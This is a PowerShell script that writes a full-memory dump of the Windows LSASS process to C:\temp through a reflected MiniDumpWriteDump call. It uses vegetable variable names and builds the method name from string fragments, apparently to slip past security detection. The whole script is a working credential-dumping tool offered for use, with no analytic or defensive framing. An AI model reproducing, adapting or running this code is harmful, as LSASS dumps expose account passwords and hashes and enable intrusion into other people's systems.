# Define the output directory for logs
$carrot = "C:\temp"

# Ensure the directory exists
if (!(Test-Path -Path $carrot)) {
    New-Item -ItemType Directory -Path $carrot | Out-Null
}

# Get a process by name dynamically (instead of hardcoding LSASS directly)
$potato = "lsass"
$cabbage = Get-Process | Where-Object { $_.Name -eq $potato }

# If no process found, exit
if (-not $cabbage) {
    Write-Output "Target process '$potato' not found."
    exit
}

# Load Windows Error Reporting API
$tomato = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
$lettuce = $tomato.GetNestedType('NativeMethods', 'NonPublic')
$onion = [Reflection.BindingFlags] 'NonPublic, Static'

# More complex concatenation for the method name
$eggplantParts = @("Mi", "ni", "Du", "mp", "Wr", "it", "e", "Du", "mp")
$eggplantComplex = -join ($eggplantParts[0..1] + $eggplantParts[2..3] + $eggplantParts[4..5] + $eggplantParts[6..7] + $eggplantParts[8..8])

# Now $eggplantComplex contains the full method name
$methodName = $eggplantComplex

# Get the method to write dump
$zucchini = $lettuce.GetMethod($methodName, $onion)

# Define the dump file path
$broccoli = "$($cabbage.Name)_$($cabbage.Id).dmp"
$radish = Join-Path -Path $carrot -ChildPath $broccoli

# Open file stream for the dump
$spinach = New-Object IO.FileStream($radish, [IO.FileMode]::Create)

# Define the dump type (2 = MiniDumpWithFullMemory)
$asparagus = [UInt32] 2

# Call the MiniDumpWriteDump function
$pumpkin = $zucchini.Invoke($null, @($cabbage.Handle, 0, $spinach.SafeFileHandle, $asparagus, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero))

# Close the file stream
$spinach.Close()

# Check for success
if ($pumpkin) {
    Write-Output "Dump successfully created: $radish"
} else {
    Write-Output "Failed to create dump."
}
